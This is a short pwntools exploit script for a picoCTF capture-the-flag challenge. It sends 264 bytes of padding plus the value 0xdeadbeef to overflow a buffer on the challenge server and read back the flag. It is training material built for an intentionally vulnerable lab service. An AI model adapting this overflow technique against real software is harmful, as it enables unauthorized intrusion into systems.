#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './chall'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote():
    return connect("mars.picoctf.net", 31890)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start_remote()

io.recvuntil(b"?\n")
#io.sendline(cyclic(300))
#code = io.recvline().decode().split(" == ")[1][2:10]
#print(code)
#char_code = "".join(chr(int(code[i*2:i*2+2], 16)) for i in range(len(code)//2))
#print(cyclic_find(char_code[::-1]))

padding = "a"*264
payload = b"\xef\xbe\xad\xde"

io.sendline(padding.encode()+payload)
io.sendline(b"\xef\xbe\xad\xde")
code = io.recvline()
msg = io.recvline()
flag = io.recvline().decode()
print(flag)
